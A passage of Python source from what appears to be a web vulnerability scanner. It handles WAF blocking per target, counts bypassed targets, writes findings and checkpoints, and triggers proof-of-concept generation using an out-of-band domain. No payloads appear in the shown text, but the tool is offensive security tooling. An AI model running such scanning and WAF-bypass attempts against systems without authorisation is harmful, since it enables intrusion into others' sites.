        # 🔒 CHECK IF TARGET WAS BLOCKED AND SAVE PARTIAL RESULTS
        if BLOCK_HANDLER_AVAILABLE and block_handlers[u] and block_handlers[u].is_target_blocked():
            sys.stdout.write(f'\n\033[1;31m[🚨] Target {scope_label} was blocked during scanning{Style.RESET_ALL}\n')
            sys.stdout.flush()
            
            # Increment block counter
            blocked_urls += 1
            
            if u in result_savers and result_savers[u]:
                result_savers[u].save_partial_results(u, f"WAF blocking after {block_handlers[u].block_count} attempts")
            
            # If it's the only URL, close the program
            if total_urls == 1:
                sys.stdout.write(f'\n\033[1;31m🚨 Single target blocked - terminating scan{Style.RESET_ALL}\n')
                sys.stdout.flush()
                sys.stdout.write(f'\n\033[1;31m💾 Partial results saved to {fname if o else "output"}{Style.RESET_ALL}\n')
                sys.stdout.flush()
                if poc:
                    sys.stdout.write(f'\033[1;31m[📋] PoCs generated for discovered vulnerabilities{Style.RESET_ALL}\n')
                    sys.stdout.flush()
                sys.stdout.write(f'\n\033[1;31m[❌] Scan terminated due to WAF blocking{Style.RESET_ALL}\n')
                sys.stdout.flush()
                sys.exit(1)
            else:
                sys.stdout.write(f'\033[1;33m[⏭️] Continuing with next target...{Style.RESET_ALL}\n')
                sys.stdout.flush()
                # Save checkpoint before continuing
                save_checkpoint_for_url(u)
                continue
        else:
            # Target was not blocked - increment success counter
            if BLOCK_HANDLER_AVAILABLE and block_handlers[u] and block_handlers[u].block_count > 0:
                # There were successful bypass attempts
                bypassed_urls += 1
            else:
                # There was no WAF or it didn't block
                safe_urls += 1
        
        # Save output for each URL (append mode)
        if o:
            sys.stdout.write(f'\n\033[1;36m💾 Saving results for {scope_label} to {fname}...\033[0m\n')
            sys.stdout.flush()
            
            # Check if file exists (resuming from checkpoint) and add separator if needed
            file_exists = os.path.exists(fname)
            if file_exists:
                # Check if last line is not a separator (to avoid duplicate separators)
                try:
                    with open(fname, 'r', encoding='utf-8') as f:
                        lines = f.readlines()
                        if lines and not lines[-1].strip().startswith('='):
                            # Last line is not a separator, add resume marker
                            with open(fname, 'a', encoding='utf-8') as f:
                                f.write(f"\n{'='*80}\n")
                                f.write(f"RESUMING SCAN FROM CHECKPOINT\n")
                                f.write(f"TIMESTAMP: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                                f.write(f"{'='*80}\n\n")
                except Exception:
                    pass  # If we can't read, just continue with append
            
            # Count total vulnerabilities
            total_vulns = sum(len(vulns) for vulns in vulnerabilities_by_type.values())
            
            if total_vulns > 0:
                # Write directly to file in append mode
                try:
                    with open(fname, 'a', encoding='utf-8') as f:
                        f.write(f"\n[SCAN RESULTS FOR: {u}]\n")
                        f.write(f"[TIMESTAMP: {time.strftime('%Y-%m-%d %H:%M:%S')}]\n")
                        f.write(f"[TOTAL VULNERABILITIES FOUND: {total_vulns}]\n")
                        f.write("-" * 60 + "\n")
                        
                        # Write vulnerabilities organized by type
                        for vuln_type, vulns in vulnerabilities_by_type.items():
                            if vulns:
                                f.write(f"\n=== {vuln_type} VULNERABILITIES ({len(vulns)} found) ===\n")
                                for vuln in vulns:
                                    if isinstance(vuln, str) and vuln.strip():
                                        f.write(f"{vuln}\n")
                                f.write("\n")
                        
                        f.write("-" * 60 + "\n\n")
                        
                except Exception as e:
                    sys.stdout.write(f'\033[1;33m[⚠️] Warning: Could not write vulnerabilities to output file: {e}\033[0m\n')
                    sys.stdout.flush()
            else:
                # If no vulnerabilities, add message
                try:
                    with open(fname, 'a', encoding='utf-8') as f:
                        f.write(f"[INFO] No vulnerabilities found for {u}\n")
                except Exception as e:
                    sys.stdout.write(f'\033[1;33m[⚠️] Warning: Could not write to output file: {e}\033[0m\n')
                    sys.stdout.flush()
            
            # Add separator for next URL
            try:
                with open(fname, 'a', encoding='utf-8') as f:
                    f.write(f"\n{'='*80}\n")
                    f.write(f"SCAN COMPLETED FOR: {u}\n")
                    f.write(f"TIMESTAMP: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write(f"{'='*80}\n\n")
            except Exception as e:
                sys.stdout.write(f'\033[1;33m[⚠️] Warning: Could not add separator to output file: {e}\033[0m\n')
                sys.stdout.flush()
        
        # 🔍 GENERATE PoCs BY DOMAIN - BEFORE CLEARING VULNERABILITIES
        if poc and vulnerabilities_by_type:
            # Extract domain from current URL
            parsed_url = urlparse(u)
            domain = parsed_url.netloc.lower()
            
            # Create vulnerability dictionary for this domain
            domain_vulnerabilities = {}
            for vuln_type, vulns in vulnerabilities_by_type.items():
                if vulns:  # Only if there are vulnerabilities of this type
                    domain_vulnerabilities[vuln_type] = vulns
            
            # Generate PoCs for this domain if there are vulnerabilities
            if domain_vulnerabilities:
                sys.stdout.write(f'\n\033[1;33m[!] Generating PoCs for domain: {domain}\033[0m\n')
                sys.stdout.flush()
                generate_pocs_for_domain(domain_vulnerabilities, domain, oob_domain=oob_domain)
        
        # Clear vulnerability list for next URL
        urls_vulnerables.clear()
        
        # Clear vulnerability dictionary by type for next URL
        for vuln_type in vulnerabilities_by_type:
            vulnerabilities_by_type[vuln_type].clear()
        
        # 🔄 RESET BLOCK COUNTERS FOR NEXT TARGET
        if BLOCK_HANDLER_AVAILABLE and block_handlers[u]:
            block_handlers[u].reset_block_count()
            if u in result_savers and result_savers[u]:
                result_savers[u].clear_partial_results()
        
        sys.stdout.write(f'\n\033[1;36m✅ Completed scan for {scope_label} ({processed_urls}/{total_urls})\033[0m\n')
        sys.stdout.flush()
        
        # 🔄 SAVE CHECKPOINT after processing each URL
        save_checkpoint_for_url(u)
        sys.stdout.write(f'\033[1;32m💾 Progress saved: {processed_urls}/{total_urls} URLs processed\033[0m\n')
        sys.stdout.flush()
        
        sys.stdout.write('\033[1;36m' + '='*80 + '\033[0m\n')
        sys.stdout.flush()

    # 🔍 GENERATE PoCs AT THE END - ONLY IF DOMAIN LIST WAS NOT USED
    # If domain list (-l) was used, PoCs were already generated per domain
    if poc and len(urls) == 1:  # Only generate at the end if it's a single domain
        # Check if there are real vulnerabilities
        has_vulnerabilities = any(vulns for vulns in vulnerabilities_by_type.values())

        if has_vulnerabilities:
            sys.stdout.write(f'\n\033[1;33m[!] Generating Proof of Concepts (PoCs) for all vulnerabilities...\033[0m\n')
            sys.stdout.flush()
            # Use the first URL as target for the PoC
            target_url = urls[0] if urls else "unknown"
            generate_pocs_for_vulnerabilities(vulnerabilities_by_type, target_url, None, oob_domain=oob_domain)
        else:
            sys.stdout.write(f'\n\033[1;33m[!] No vulnerabilities found - skipping PoC generation\033[0m\n')
            sys.stdout.flush()
    elif poc and len(urls) > 1:
        sys.stdout.write(f'\n\033[1;32m[!] PoCs already generated per domain during scanning\033[0m\n')
        sys.stdout.flush()

    # 🔄 DELETE CHECKPOINT when scan completes successfully
    if checkpoint_manager and checkpoint_id:
        try:
            checkpoint_manager.delete_checkpoint(checkpoint_id)
            sys.stdout.write(f'\n\033[1;32m[✅] Scan completed - checkpoint deleted\033[0m\n')
            sys.stdout.flush()
        except Exception as e:
            sys.stdout.write(f'\033[1;33m[⚠️] Error deleting checkpoint: {e}\033[0m\n')
            sys.stdout.flush()

    sys.stdout.write('\033[1;31mCLOSE PROGRAM\033[0m\n')
    sys.stdout.flush()
    sys.exit(0)


